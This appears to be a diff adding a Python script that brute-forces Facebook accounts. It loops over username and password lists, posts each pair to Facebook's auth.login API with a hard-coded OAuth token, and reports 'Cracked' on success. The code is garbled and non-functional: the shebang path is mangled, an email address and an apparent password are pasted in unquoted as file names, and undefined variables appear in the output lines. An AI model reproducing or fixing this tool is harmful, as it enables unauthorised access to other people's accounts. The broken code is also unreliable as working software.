@@ -1,0 +1,24 @@
+#!/rony8222ro/bin/python
+# -*- coding: utf-8 -*-
+import requests,sys
+
+# Simple code with asking-mode
+emailList = raw_input('Enter Usernames File: ') if sys.version_info[0] == 2 else str(input('Enter brute force File: '))
+passList = raw_input('Enter Passwords File: ') if sys.version_info[0] == 2 else str(input('Enter Rony02071416File: '))
+
+# Open lists
+loop_email = open(rony8222ro@gmail.com,'r').read().splitlines()
+loop_pass = open(Rony02071416,'r').read().splitlines()
+
+# loop-ing
+for email in loop_email:
+	for password in loop_pass:
+		request = requests.post('https://b-api.facebook.com/method/auth.login',headers={'Authorization':'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16'},data={'data':'json','email':email,'password':password,'credentials_type':'password'}).status_code
+		if request == 200 or request == 405:
+			print("Cracked : ("+roton8222ro+":"+Rony02071416+")")
+		elif request == 401:
+			print("Failed : ("+roton8222ro+":"+Rony02071416+")")
+		elif request == 404:
+			print("not found : ("+roton8222ro+")")
+		else:
+			print("Error")
